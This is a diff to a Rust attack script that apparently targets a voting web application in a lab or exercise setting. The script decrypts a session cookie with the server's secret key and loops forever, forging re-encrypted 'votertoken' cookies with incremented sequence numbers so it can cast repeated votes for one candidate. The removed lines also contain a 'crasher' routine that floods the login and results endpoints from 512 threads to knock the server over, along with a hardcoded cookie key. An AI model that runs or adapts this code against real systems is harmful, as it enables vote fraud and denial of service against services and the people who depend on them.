@@ -7,7 +7,7 @@ use urlencoding::decode;
 use rand::RngCore;
 use std::time::Duration;
 use url::Url;
-use std::thread::{self, JoinHandle};
+use std::thread;
 
 pub const NONCE_LEN: usize = 12;
 pub const TAG_LEN: usize = 16;
@@ -15,92 +15,51 @@ pub const KEY_LEN: usize = 32;
 
 #[tokio::main]
 async fn main() {
+    let args: Vec<String> = std::env::args().collect();
+    let secret = &args[0];
     // force webserver to restart
-    crasher();
+    //crasher();
     //initialize mutable cookie storage
     let jar = reqwest_cookie_store::CookieStore::default();
     let jar = reqwest_cookie_store::CookieStoreMutex::new(jar);
     let jar = std::sync::Arc::new(jar);
+    let mut sequence_num: u32=1;
     //initialize client with said storage
-    let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).danger_accept_invalid_certs(true).build().unwrap();
+    let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).build().unwrap();
     //log in to server legitimatley
-    client.post("https://voteapi/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
-    //vote legitly to grab cookie
-    let mut sequence_num: u32;
-    client.post("https://voteapi/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
+    client.post("https://api.internal/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
     {
-        let mut decrypted: String = String::from("1");
-        let mut store = jar.lock().unwrap();
+        let store = jar.lock().unwrap();
         for c in store.iter_unexpired() {
         println!("Got cookie {},{}\n", &c.name(),&c.value());
-        decrypted = unseal(c.name(),c.value()).unwrap();
-        println!("Decrypted value: Name={}, value={}",&c.name(),&decrypted);
+        sequence_num = unseal(c.name(),c.value(),&secret).unwrap().parse::<u32>().unwrap();
+        println!("Decrypted value: Name={}, value={}",&c.name(),&sequence_num);
         }
-        // remove legit cookie from our client
-        store.clear();
-        // add illegitimate cookie
-        sequence_num = decrypted.parse::<u32>().unwrap() + 1;
-        let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string()));
-        store.insert_raw(&newcookie, &Url::parse("https://voteapi").unwrap()).unwrap();
     }
+    //vote legitly to grab cookie
+    client.post("https://api.internal/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
+    sequence_num += 1;
     println!("Entering endless loop, press ctrl+C to exit.");
     loop{
-        let bruh2 = client.post("https://voteapi:8000/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
+        thread::sleep(Duration::from_millis(3000));
+        let bruh2 = client.post("https://api.internal/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
         {
             let mut store = jar.lock().unwrap();
             if bruh2.text().await.unwrap().contains("Thanks for voting"){
                 println!("Voted for gus with sequence number {}",&sequence_num);
                 store.clear();
-                sequence_num += 1;
-                let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string()));
-                store.insert_raw(&newcookie, &Url::parse("https://voteapi").unwrap()).unwrap();
-            }
+                sequence_num += 1;}
+                let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string(),&secret));
+                store.insert_raw(&newcookie, &Url::parse("https://api.internal").unwrap()).unwrap();
         
         }
     }
 }
 
-/*Crasher? I hardly Know 'er!
-spawns threads to crash webserver by spamming login requests */
-fn crasher() {
-    let mut crashers: Vec<JoinHandle<()>> = vec!();
-    for i in 0..256{
-    let a = thread::spawn(move || {
-    loop{
-        let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(10000)).danger_accept_invalid_certs(true).build().unwrap();
-        match client.post("https://voteapi/login").form(&[("ssn", "1"),("password","jalskdjfh43u4halksdflkajsdlfkjasfy2323ADSFLSkasdfasd")]).send(){
-            Ok(_) => (),
-            Err(e) => {
-                println!("crasher thread {} {}",i,e);
-                break;
-            }
-        }
-        }
-    });
-    let b = thread::spawn(move || {
-        loop{
-            let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(10000)).danger_accept_invalid_certs(true).build().unwrap();
-            match client.get("https://voteapi/results").send(){
-                Ok(_) => (),
-                Err(e) => {
-                    println!("crasher thread {} {}",i,e);
-                    break;
-                }
-            }
-            } 
-    });
-    crashers.push(a);
-    crashers.push(b);
-    }
-    for t in crashers.into_iter(){
-        t.join().unwrap();
-    }
-}
-
 
 // taken from the cookie secure crate
-fn unseal(name: &str, value: &str) -> Result<String, &'static str> {
-    let key = Key::derive_from(base64::decode("2bChvsu8Ko4rk1jYV5xijcAN5IQVdI+wBdz9lEJRUdY=").unwrap().as_slice());
+fn unseal(name: &str, value: &str, secret: &String) -> Result<String, &'static str> {
+    let key = Key::derive_from(base64::decode(secret).unwrap().as_slice());
 
     // cookie is in URL format which will make base64 throw a fit, decode cookie content
     let cstring = decode(value).expect("utf8").into_owned();
@@ -118,9 +77,9 @@ fn unseal(name: &str, value: &str) -> Result<String, &'static str> {
         .and_then(|s| String::from_utf8(s).map_err(|_| "bad unsealed utf8"))
 }
 
-fn encrypt_cookie(name: &str, value: &str) -> String {
+fn encrypt_cookie(name: &str, value: &str, secret: &String) -> String {
     // Create a vec to hold the [nonce | cookie value | tag].
-    let key = Key::derive_from(base64::decode("2bChvsu8Ko4rk1jYV5xijcAN5IQVdI+wBdz9lEJRUdY=").unwrap().as_slice());
+    let key = Key::derive_from(base64::decode(secret).unwrap().as_slice());
     let cookie_val = value.as_bytes();
     let mut data = vec![0; NONCE_LEN + cookie_val.len() + TAG_LEN];
 
